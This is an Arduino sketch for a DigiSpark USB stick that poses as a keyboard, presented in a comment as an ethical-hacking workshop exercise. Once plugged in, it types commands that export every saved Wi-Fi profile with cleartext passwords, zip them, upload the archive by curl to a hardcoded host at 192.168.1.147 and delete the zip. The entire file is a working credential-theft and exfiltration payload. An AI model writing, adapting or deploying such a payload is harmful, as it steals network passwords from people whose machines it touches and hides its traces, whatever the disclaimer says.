#include "DigiKeyboard.h"

/**
 * This workshop is for educational purposes only.
 * Ethical hacking is conducted with the explicit permission of the system owner to improve security.
 */

void setup() {
    // Open the terminal
    DigiKeyboard.delay(2000);
    DigiKeyboard.sendKeyStroke(0);
    DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
    DigiKeyboard.delay(600);
    DigiKeyboard.print("cmd");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);

    // Change the directory the %TEMP%
    DigiKeyboard.delay(1000);
    DigiKeyboard.print("cd %TEMP%");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);

    // Create a temporary folder
    DigiKeyboard.delay(1000);
    DigiKeyboard.print("mkdir tmp");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);

    // Export the wifi passwords
    DigiKeyboard.delay(1000);
    DigiKeyboard.print("netsh wlan export profile folder=tmp key=clear");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);

    // Compress the folder
    DigiKeyboard.delay(1000);
    DigiKeyboard.print("powershell Compress-Archive -Path \".\\tmp\" -DestinationPath \".\\tmp.zip\"");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);

    // Upload the zip
    DigiKeyboard.delay(1000);
    DigiKeyboard.print("curl -X POST -F \"file=@.\\tmp.zip\" http://192.168.1.147:5000/upload_zip\"");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);

    // Remove the zip
    DigiKeyboard.delay(1000);
    DigiKeyboard.print("powershell Remove-Item tmp.zip");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
}
void loop() {
  //empty
}